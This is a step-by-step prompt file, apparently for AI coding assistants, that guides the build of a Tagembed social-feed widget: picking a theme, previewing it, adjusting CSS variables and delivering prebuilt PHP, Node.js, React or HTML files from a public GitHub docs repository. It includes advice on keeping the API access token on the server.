# Social widget - the build, step by step

Every link below is written out in full - fetch it as written.

A short guided build. Each step is ONE reply, then you stop and wait
for my answer. Keep every question short, as a numbered list I can
answer with one number or word.

These steps come from Tagembed's public API docs repo. Everything they
use is static: small HTML/CSS pages (the gallery has no scripts; slider
previews have a few lines for their arrows) and finished starter code
that calls the Tagembed API with my own access token from my .env file.
You are welcome to read any file before you show it and to tell me if
something looks wrong.

Speed matters on every step. Everything is already built - the
previews, the code for every stack, the READMEs - so besides this file
you fetch only what steps 1, 2 and 4 name, and there is no new code to
write (the one exception: step 4's port for an Other stack). Skip the
plan and the recap: keep each reply to the file plus the lines the step
names.

If you can write files in my project (Claude Code, Cursor, Copilot,
Codex, Windsurf, Gemini CLI...), save the files yourself instead of
showing them to me - same content, same paths.

## Step 1 - pick a theme (fetch ONE file)

Fetch RAW
https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/theme-gallery.html
and give it back to me as
gallery.html, exactly as it is, character for character - same CSS,
markup, links and base64 "data:image" picture - so this chat shows it
(as an artifact, canvas or preview pane). Do not redesign, shorten or
rewrite it, and fetch nothing else. Then ask which one I
want - "skip", or any reply that is not a number or name, means
3. Modern Card.

Only if this chat cannot show a preview: skip gallery.html and show
me this table instead, then the same question.

If you are ChatGPT or Gemini: fetch nothing in this step and skip
gallery.html - you cannot open or read it whole from this chat. Show
this table, then the same question.

| # | Theme | For |
|---|---|---|
| 1 | Classic Card | social |
| 2 | Social Card | social |
| 3 | Modern Card | social |
| 4 | Classic Photo | social |
| 5 | Square Photo | social |
| 6 | Collage | social |
| 7 | Vivid | social |
| 8 | Horizontal Slider | social |
| 9 | Horizontal Columns | social |
| 10 | Slider | social |
| 11 | Reels | social |
| 12 | Story Theme | social |
| 13 | Single Post | social |
| 14 | Widget Theme | social |
| 15 | Review Box | reviews |
| 16 | Review Carousel | reviews |
| 17 | Review List | reviews |

Then stop.

## Step 2 - the preview (fetch ONE file, write no code)

Each theme's preview is a finished file. Its name (the "slug") is the
theme name in lower case with dashes: 1 classic-card, 2 social-card, 3 modern-card, 4 classic-photo, 5 square-photo, 6 collage, 7 vivid, 8 horizontal-slider, 9 horizontal-columns, 10 slider, 11 reels, 12 story-theme, 13 single-post, 14 widget-theme, 15 review-box, 16 review-carousel, 17 review-list.

Fetch RAW the preview of the theme I picked - its number in this list:
1. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/classic-card.html
2. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/social-card.html
3. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/modern-card.html
4. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/classic-photo.html
5. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/square-photo.html
6. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/collage.html
7. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/vivid.html
8. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/horizontal-slider.html
9. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/horizontal-columns.html
10. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/slider.html
11. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/reels.html
12. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/story-theme.html
13. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/single-post.html
14. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/widget-theme.html
15. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/review-box.html
16. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/review-carousel.html
17. https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/guides/previews/review-list.html
and give it back to me as
preview.html, exactly as it is, character for character - same CSS,
markup, sample posts, image URLs and base64 "data:image" thumbnails -
so this chat shows it (as an artifact, canvas or preview pane). Do not
redesign, shorten or rewrite it, and fetch nothing else.

Then reply with only this:
- one line: images show blurred inside this chat's preview; for the
  full images, save preview.html and double-click it.
- these two questions:
  1. Want to change anything? (colours, font, columns, corners,
     spacing...) - or say "no".
  2. Which stack should I build it in? PHP / Node.js / React / Simple HTML /
     Other (name it - Laravel, WordPress, Next.js, Vue, Django, Flask...)

If you are ChatGPT or Gemini: fetch nothing in this step and skip
preview.html - you cannot open or read it whole from this chat. The slug never carries the
number: 5 is square-photo, not 5-square-photo. Reply with only one
line: the design shows with the sample posts once the build runs
(step 4), then the same two questions.

## Step 3 - customise (optional, repeat as often as I ask)

Do not redesign the preview. Every look is set by CSS variables, so a
change is a few lines in a file called custom.css. The variables:
--tbd-bg (page), --tbd-surface (card), --tbd-text, --tbd-author,
--tbd-font, --tbd-weight, --tbd-size (text size), --tbd-radius (card
corners), --tbd-img-radius (image corners), --tbd-gap (space between
cards), --tbd-pad (space inside a card), --tbd-cols (columns, or cards
per view on sliders), --tbd-align, --tbd-lines (text lines shown).
Class names, for anything else: .tbd-card, .tbd-media, .tbd-head,
.tbd-author, .tbd-date, .tbd-net, .tbd-text, .tbd-stars, .tbd-header.

Write custom.css - only what changes, mostly one `:root { ... }` block,
adding to any custom.css from earlier in this chat. Then reply with:
1. preview.html again, so this chat shows the change: the step 2 file
   exactly as it was, with the whole custom.css pasted in just before
   its </style>, under a /* custom.css */ comment. Change nothing else
   in the file.
2. custom.css in one short code block, with one line: keep it - it
   goes into the build in step 4.
Then ask: "Anything else to change, or which stack? (PHP / Node.js / React /
Simple HTML / Other)"
Fetch nothing. It ends when I name a stack.

If you are ChatGPT or Gemini: skip item 1 (you have no preview.html in this chat)
and give only item 2 - the change shows once the build runs.

## Step 4 - the files for my stack (fetch 3 files, write no new code - except Other)

If you are ChatGPT or Gemini: fetch nothing in this step - you cannot
open or read these files whole from this chat, and the finished zip
already exists. For PHP /
Node.js / React / Simple HTML reply with only:
- the download link for my stack:
  - PHP: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-php.zip
  - Node.js: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-nodejs.zip
  - React: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-react.zip
  - Simple HTML: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-html.zip
  - finished code, every theme, the sample posts and README.md;
- .env as a code block: ACCESS_TOKEN= (empty),
  API_BASE_URL=https://api.tagembed.com/api, WIDGET_THEME=<slug>;
- custom.css, only if step 3 made one - the final version;
- one line: unzip it, put .env and custom.css in the unzipped folder;
- then everything under "After the files" below, from "how to start it"
  to the token question.
For an Other stack, say in one line that it needs an AI that can read
files whole (Claude, or an editor agent) and offer the closest zip above.
Everything else in this step is for every other AI.

The code for every stack is finished. Fetch RAW these three
- nothing else:
1. My stack's files, all in one text file - each file starts with a
   line "===== FILE: <path> =====":
   - PHP:         https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-php.txt
   - Node.js:     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-nodejs.txt
   - React:       https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-react.txt
   - Simple HTML: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/dist/social-widget-html.txt
2. and 3. My theme's .css and .json:
   - classic-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-card.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-card.json
   - social-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/social-card.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/social-card.json
   - modern-card: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/modern-card.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/modern-card.json
   - classic-photo: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-photo.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/classic-photo.json
   - square-photo: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/square-photo.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/square-photo.json
   - collage: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/collage.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/collage.json
   - vivid: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/vivid.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/vivid.json
   - horizontal-slider: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-slider.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-slider.json
   - horizontal-columns: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-columns.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/horizontal-columns.json
   - slider: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/slider.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/slider.json
   - reels: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/reels.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/reels.json
   - story-theme: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/story-theme.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/story-theme.json
   - single-post: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/single-post.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/single-post.json
   - widget-theme: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/widget-theme.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/widget-theme.json
   - review-box: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-box.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-box.json
   - review-carousel: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-carousel.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-carousel.json
   - review-list: https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-list.css and
     https://raw.githubusercontent.com/wallapi/tagembed.com-API-Docs/build-2026-09-28c/templates/themes/review-list.json

Hand every file over here in the chat, each as its own code block
headed with its path, ready to save - exactly as fetched, character for
character. Do not rewrite, shorten, "improve" or merge any of them, and
write no "rest stays the same". The files, in this order:
- every file from the stack text file - README.md included (it is
  already written: how to run, settings, the look, the cache, fixes) -
  except .env.example and except the sample file I do not need: samples/social.json for a
  social theme, samples/reviews.json for a review theme (15-17) - give
  only that one;
- themes/<slug>.css and themes/<slug>.json (keep the themes/ folder);
- custom.css, only if step 3 made one - the final version, with every
  change from step 3 (the code adds it after the theme, so my changes
  show);
- .env - the .env.example text with WIDGET_THEME=<slug> filled in and
  ACCESS_TOKEN left empty (it shows the sample posts until I add it).

### Other stack (anything not in the four above)

Still fetch only 3 files, then port - fast, no plan, no scaffold. The
closest finished bundle is the reference; copy its logic, markup,
.tbd-* classes and cache as they are, changing only the language:
- PHP frameworks (Laravel, WordPress, CodeIgniter, Symfony...):
  social-widget-php.txt
- Frontend-only (Vue, Angular, Svelte, plain JS...):
  social-widget-react.txt - keep its server.js (it holds the token),
  port only the component
- Everything else (Next.js, Nuxt, Express, Python, Ruby, Go, Java,
  .NET...): social-widget-nodejs.txt
plus themes/<slug>.css and themes/<slug>.json as above.

Write only the files that stack needs to run - usually 2-4:
- one server-side file that calls the API with the token and caches
  (a route/controller, or the framework's server route - e.g. a
  Next.js route handler or server component, a Django/Flask view);
- one view/template/component, only if the stack separates them;
- the dependency file, only if the stack has one (package.json,
  requirements.txt, composer.json, go.mod...), with the fewest
  packages;
- themes/ and custom.css exactly as in the list above;
- .env - the reference bundle's .env.example keys (ACCESS_TOKEN empty,
  API_BASE_URL, WIDGET_THEME=<slug>, PORT only if the stack uses one),
  read on the server the stack's usual way (Laravel env()/config,
  Django/Flask python-dotenv, Next.js .env.local, Rails/Go/others a
  dotenv package or the host's settings) - never with a NEXT_PUBLIC_,
  VITE_, REACT_APP_ or other browser prefix. In a project I already
  have, do not replace my .env: give only these lines to add to it.
  One line: add .env to .gitignore;
- README.md: the reference bundle's README (already fetched) adapted
  to this stack - same sections (Files, Run it, Settings, Changing the
  look, How the cache works, If it goes wrong), short, written for
  someone who has never used a terminal. Change only the file names,
  commands and where each file goes; keep its line that the token
  stays on the server.
No samples/ folder and no sample posts for an Other stack: drop
samplePosts() / sw_samples() and the file read. An empty ACCESS_TOKEN
returns no posts (touching neither the API nor the cache) and the page
shows the bundle's .tbd-note line instead: "Set ACCESS_TOKEN in .env
to show your gallery."

For a framework I already have (Laravel, WordPress, Django, Rails...),
give only the files to drop into my project and one line on where each
goes - never a new project, config boilerplate, Docker, CI, tests,
lock files or extra helpers.

The token stays server-side in every port: the browser only ever
calls my own server's route, never api.tagembed.com.

Delivery, so I can download instead of copying code blocks:
- Can write files in my project: save them there (as said at the top).
- Otherwise, if this chat can make a downloadable file (ChatGPT,
  claude.ai, Gemini...): put every file in one
  social-widget-<stack>.zip, keeping the paths, and give me only the
  download link plus one line per file (path - what it does). No code
  blocks - that is slower and I would copy them by hand.
- Only if it cannot make files: each file as its own code block headed
  with its path.

After the files, short:
- one line: save them all in one folder, keeping the paths (themes/,
  samples/, and src/ for React; for Other, where each file goes).
- how to start it, one line:
  - PHP / Simple HTML: `php -S localhost:8080`, open
    http://localhost:8080 - or upload the folder to any PHP host.
  - Node.js: `npm install`, then `npm start`, open http://localhost:3000
  - React: `npm install`, then `npm run dev`, open http://localhost:5173
  - Other: that stack's own one-line start command.
- "README.md has every step, for someone who has never used a terminal."
Then a short "What you can add next" list - 4 to 6 one-line ideas I
could send back as my next request, picked from: a network filter bar,
a "Load more" / next-page link, auto-refresh, a lightbox for images and
videos, shopping tags on posts, dropping the widget into a section of
my existing site, Redis or another cache.

Always add this one line, for every stack: keep ACCESS_TOKEN (and any
other key) only on the server - in .env or the host's environment
settings - never in frontend code, a public folder, a VITE_ /
NEXT_PUBLIC_ / REACT_APP_ variable, or git (put .env in .gitignore);
anywhere the browser can reach, the token is disclosed.

End by telling me where my access token is - Tagembed dashboard, the
gallery's card, its three-dot menu, "Access Token" - and that it goes
after ACCESS_TOKEN= in my .env; until then the widget shows the sample
posts. If you can write files in my project, offer to add it to .env
for me; in a browser chat, do not ask me to paste it into the chat.

If you cannot open a link, say so in one line - do not build from
memory.
